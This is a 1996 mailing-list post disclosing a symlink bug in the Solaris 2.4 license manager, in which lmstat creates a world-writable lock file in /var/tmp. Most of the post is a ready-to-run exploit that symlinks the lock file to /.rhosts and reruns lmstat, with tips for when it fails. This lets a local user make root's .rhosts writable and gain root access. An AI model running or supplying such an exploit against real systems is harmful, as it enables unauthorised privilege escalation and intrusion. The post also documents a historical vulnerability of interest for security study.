@@ -1,0 +1,30 @@
+
+                        solaris 2.4 license-manager bug
+                                       
+   Grant Kaufmann (gkaufman@cs.uct.ac.za)
+   Wed, 16 Oct 1996 23:46:07 +0200
+   
+Another bug for solaris 2.4
+The license manager must be running, expect both
+lmgrd.ste & suntechd to be somewhere in your process table.
+
+/var/tmp/locksuntechd will be created by anyone who runs
+lmstat, with perms 666 and quite happy to follow symlinks.
+Anyway, here's the exploit.
+
+-+-+-+ CUT
+rm /var/tmp/locksuntechd
+ln -s /.rhosts /var/tmp/locksuntechd
+lmstat -c <insert your license file name here>
+
+NOTES
+lmstat could be anywhere on your filesystem. try /etc/opt/licenses
+I found that sometimes this didn't work first time. It didn't create
+the file. Just run lmstat again and it'll work.
+-+-+-+
+
+--
+Grant
+--
+http://www.cs.uct.ac.za/~gkaufman/pgp.html
+
